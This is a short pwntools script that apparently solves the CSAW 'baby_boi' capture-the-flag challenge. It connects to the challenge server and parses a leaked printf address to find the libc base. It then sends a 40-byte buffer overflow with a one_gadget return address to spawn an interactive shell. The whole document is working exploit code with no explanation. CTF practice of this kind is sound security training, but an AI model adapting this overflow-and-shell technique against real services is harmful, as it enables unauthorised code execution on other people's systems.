#!/usr/bin/env python2
from pwn import *

e = ELF('./baby_boi')
libc = ELF('./libc-2.27.so')
p = remote('pwn.chal.csaw.io',1005)
#p = process('./baby_boi')
offset = 'A'*40
p.recvline()
leak = p.recvline()
leak = int(leak[leak.find('0x'):].strip(),16)
libc_base_address = leak-libc.symbols['printf']
p.sendline(offset+p64(0x4f322+libc_base_address)) #one_gadget
p.interactive()
